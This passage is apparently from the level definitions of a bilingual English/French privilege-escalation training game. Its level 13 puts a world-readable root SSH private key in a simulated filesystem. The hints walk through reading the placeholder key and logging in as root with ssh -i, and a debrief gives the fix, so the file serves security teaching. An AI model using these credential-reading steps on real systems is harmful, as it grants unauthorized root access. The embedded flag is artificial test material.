                fix: 'Ne jamais utiliser de wildcard non quoté dans un script privilégié. Passe une liste de fichiers explicite ou utilise "--" et le préfixe ./ (tar ... -- *), évite d\'archiver en root des dossiers modifiables par l\'utilisateur, et préfère des API sûres au globbing shell.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 13 — World-readable root SSH private key
    // ─────────────────────────────────────────────────────────────
    {
        id: 13,
        codename: 'box-13',
        title: { en: 'Box-13 · Keys to the Kingdom', fr: 'Box-13 · Les clés du royaume' },
        brief: {
            en: 'A backup left root\'s SSH private key world-readable. If root accepts that key, you can just log in as root.',
            fr: 'Une sauvegarde a laissé la clé privée SSH de root lisible par tous. Si root accepte cette clé, tu peux simplement te connecter en root.'
        },
        user: 'player',
        host: 'box-13',
        cwd: '/home/player',
        objectives: {
            en: ['Find readable files under /opt/backup', 'Recover root\'s private SSH key', 'Log in as root with it'],
            fr: ['Trouver les fichiers lisibles sous /opt/backup', 'Récupérer la clé privée SSH de root', 'Se connecter en root avec']
        },
        hints: {
            en: [
                'Look for stray key material: ls -la /opt/backup — id_rsa is world-readable.',
                'cat /opt/backup/id_rsa — that is root\'s private key, and /root/.ssh/authorized_keys trusts it.',
                'Use it to log in as root:\n  ssh -i /opt/backup/id_rsa root@localhost'
            ],
            fr: [
                'Cherche des clés qui traînent : ls -la /opt/backup — id_rsa est lisible par tous.',
                'cat /opt/backup/id_rsa — c\'est la clé privée de root, et /root/.ssh/authorized_keys lui fait confiance.',
                'Utilise-la pour te connecter en root :\n  ssh -i /opt/backup/id_rsa root@localhost'
            ]
        },
        flag: 'flag{r00t_ssh_key_l00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt', '.ssh'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{r00t_ssh_key_l00t}\n' },
            '/root/.ssh': { type: 'dir', owner: 'root', mode: '700', children: ['authorized_keys'] },
            '/root/.ssh/authorized_keys': { type: 'file', owner: 'root', mode: '600', content: 'ssh-rsa AAAAB3NzaC1yc2E...backup-key root@box-13\n' },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: ['backup'] },
            '/opt/backup': { type: 'dir', owner: 'root', mode: '755', children: ['id_rsa', 'id_rsa.pub', 'README'] },
            '/opt/backup/id_rsa': { type: 'file', owner: 'root', mode: '644', content:
`-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
ZW3vYmFja3VwLWtleS1sZWFrZWQtZG8tbm90LXVzZS1pbi1wcm9kAAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
` },
            '/opt/backup/id_rsa.pub': { type: 'file', owner: 'root', mode: '644', content: 'ssh-rsa AAAAB3NzaC1yc2E...backup-key root@box-13\n' },
            '/opt/backup/README': { type: 'file', owner: 'root', mode: '644', content: 'Nightly key backup. TODO: fix perms (currently world-readable!).\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'ssh'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/ssh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'ssh_key' }
        ],
        debrief: {
            en: {
                vuln: 'World-readable root SSH private key',
                why: 'A backup job copied root\'s private key to /opt/backup and left it world-readable. Because /root/.ssh/authorized_keys trusts the matching public key, anyone who can read the private key can authenticate as root over SSH — no password, no exploit.',
                fix: 'Private keys must be 600 and owned by their user; never copy them to shared/backup locations in cleartext. Encrypt backups, rotate any exposed key immediately, and audit file permissions on key material.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reading-root-ssh-keys'
            },
            fr: {
                vuln: 'Clé privée SSH de root lisible par tous',
                why: 'Une sauvegarde a copié la clé privée de root dans /opt/backup en la laissant lisible par tous. Comme /root/.ssh/authorized_keys fait confiance à la clé publique correspondante, quiconque peut lire la clé privée s\'authentifie en root via SSH — sans mot de passe ni exploit.',
                fix: 'Les clés privées doivent être en 600 et appartenir à leur utilisateur ; ne jamais les copier en clair dans des emplacements partagés/de sauvegarde. Chiffre les sauvegardes, révoque immédiatement toute clé exposée, et audite les permissions du matériel de clés.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reading-root-ssh-keys'
            }
        }
    }
];
